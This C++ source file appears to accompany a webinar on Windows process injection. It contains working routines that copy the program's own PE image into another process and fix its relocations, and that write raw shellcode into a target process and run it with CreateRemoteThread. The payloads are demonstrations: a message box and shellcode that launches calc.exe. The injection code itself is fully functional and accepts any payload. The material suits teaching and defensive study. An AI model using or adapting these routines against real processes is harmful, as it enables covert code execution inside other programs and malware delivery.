#include "pch.h"
#include "pe_injection_methods.h"
#include "helper.h"

// =============================================
// PE Injection
// ---------------------------------------------
// This code needs a bit more explanation, if you are not familiar with loading PE in memory and the address rebasing. Please feel free to ask for a better explanation.
// Other blogpostes and references are one the webinar slides

DWORD TargetInjectedEntryPoint() {
    WCHAR text[128];
    wsprintf(text, L"PID: %u - Please close the messagebox", ::GetCurrentProcessId());
    MessageBox(NULL, text, L"Information", MB_ICONINFORMATION);
    return 0;
}

int injectPE(_In_ DWORD pid) {
    // Get the necessary memory address information from the injector/calling (in future called local) process
    HMODULE ptrModuleHandle = ::GetModuleHandle(NULL); // https://docs.microsoft.com/en-us/previous-versions/ms908443(v=msdn.10), lpModuleName = NULL for handle to local process
    if (!ptrModuleHandle) {
        return Error("Cannot open handle to calling process");
    }
    PIMAGE_DOS_HEADER ptrDosHeader = (PIMAGE_DOS_HEADER)ptrModuleHandle; // This is the pointer to the ImageBase
    PIMAGE_NT_HEADERS ptrNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ptrDosHeader + ptrDosHeader->e_lfanew);

    // Allocate Memory in the local process for writing the image to this address
    // Alernative use VirtualAlloc, (HANDLE)-1 refers to the callers process
    SIZE_T dwSize = ptrNtHeader->OptionalHeader.SizeOfImage;
    LPVOID ptrLocalMemory = ::VirtualAllocEx((HANDLE)-1,NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if (!ptrLocalMemory) {
        return Error("Cannot accolcate Memory");
    }
    ::CopyMemory(ptrLocalMemory, ptrModuleHandle, dwSize); //also other functions can be used, e.g. memcpy, memcpy_s, RtlCopyMemory, etc.

    // Get handle to target process by calling OpenProcess
    // dwDesiredAccess are also seen to be set to: PROCESS_ALL_ACCESS or MAXIMUM_ALLOWED (last seems not to be a good idea, if you have no exception handling)
    DWORD dwDesiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    HANDLE hTargetProcess = ::OpenProcess(dwDesiredAccess, FALSE, pid);
    if (!hTargetProcess) {
        return Error("Cannot open target process.");
    }
    LPVOID ptrTargetMemory = ::VirtualAllocEx(hTargetProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!ptrTargetMemory) {
        return Error("Cannot open allocate memory inside target process.");

    }

    // Calculations and correction of addresses for operting in target process

    typedef struct _RELOCATION_TABLE_ENTRY {
        USHORT Offset : 12;
        USHORT Type : 4;
    } RELOCATION_TABLE_ENTRY, * PRELOCATION_TABLE_ENTRY;


    PIMAGE_DATA_DIRECTORY dataDir = &ptrNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR deltaLocalToTarget = (DWORD_PTR)ptrTargetMemory - (DWORD_PTR)(PVOID)ptrModuleHandle;

    if (dataDir->Size > 0 && dataDir->VirtualAddress > 0) {
        PIMAGE_BASE_RELOCATION relocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)ptrLocalMemory + dataDir->VirtualAddress);

        while (relocTable->VirtualAddress != 0) {
            if (relocTable->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD relocDescriptorCount = (relocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PRELOCATION_TABLE_ENTRY relocRelativeVA = (PRELOCATION_TABLE_ENTRY)(relocTable + sizeof(IMAGE_BASE_RELOCATION)); // also seen as + 1, which means the same
                for (short i = 0; i < relocDescriptorCount; i++)
                {
                    if (relocRelativeVA[i].Offset)
                    {
                        PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)ptrLocalMemory + relocTable->VirtualAddress + relocRelativeVA[i].Offset);
                        *patchedAddress += deltaLocalToTarget;
                    }
                }
            }
            relocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocTable + relocTable->SizeOfBlock);
        }
    }

    ::WriteProcessMemory(hTargetProcess, ptrTargetMemory, ptrLocalMemory, dwSize, NULL);

    if (HANDLE hThread = ::CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)TargetInjectedEntryPoint + deltaLocalToTarget), NULL, 0, NULL)) {
        if (WAIT_OBJECT_0 == ::WaitForSingleObject(hThread, INFINITE)) {
            _tprintf(_TEXT("[+] Thread exited normally.\n"));
        }

        ::CloseHandle(hThread);
    }
    ::VirtualFreeEx(hTargetProcess, ptrTargetMemory, 0, MEM_RELEASE);
    ::CloseHandle(hTargetProcess);

    return 0;
}


// ==============================================
// Shellcode Injection

void injectShellCode(_In_ DWORD pid) {
    DWORD dwDesiredAccess = PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION; // often seen: PROCESS_ALL_ACCESS;

    HANDLE hProcess;
    LPVOID ptrVirtAlloc = nullptr;

    static const UCHAR shellcode_WinExecCalc[] = {
        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,
        0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,
        0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,
        0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,
        0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,
        0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,
        0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,
        0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,
        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,
        0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,
        0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,
        0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,
        0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,
        0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,
        0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,
        0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,
        0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,
        0xff,0xff,0x5d,0x48,0xba,0x1,0x0,0x0,0x0,0x0,
        0x0,0x0,0x0,0x48,0x8d,0x8d,0x1,0x1,0x0,0x0,
        0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,
        0x1d,0x2a,0xa,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,
        0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,
        0x0,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
        0x63,0x2e,0x65,0x78,0x65,0x0
    };

    if (hProcess = ::OpenProcess(dwDesiredAccess, false, pid)) {
        _tprintf(_TEXT("[+] Opened process %i successfully: %i\n"), pid, hProcess);
        if (ptrVirtAlloc = ::VirtualAllocEx(hProcess, NULL, sizeof(shellcode_WinExecCalc), MEM_COMMIT, PAGE_EXECUTE_READWRITE)) {
            _tprintf(_TEXT("[+] Allocated Memory successfully at: %p\n"), ptrVirtAlloc);

            DWORD tid;

            ::WriteProcessMemory(hProcess, ptrVirtAlloc, shellcode_WinExecCalc, sizeof(shellcode_WinExecCalc), NULL);
            _tprintf(_TEXT("[+] Wrote ShellCode to Memory\n"));

            if (HANDLE hThread = ::CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)ptrVirtAlloc, 0, 0, &tid)) {
                _tprintf(_TEXT("[+] Created Remote Threat - ID: %d - HandleID: %i"), tid, hThread);
                ::CloseHandle(hThread);
            }

            //::VirtualFreeEx(hProcess, ptrVirtAlloc, 0, MEM_RELEASE);
        }
        ::CloseHandle(hProcess);
    }
}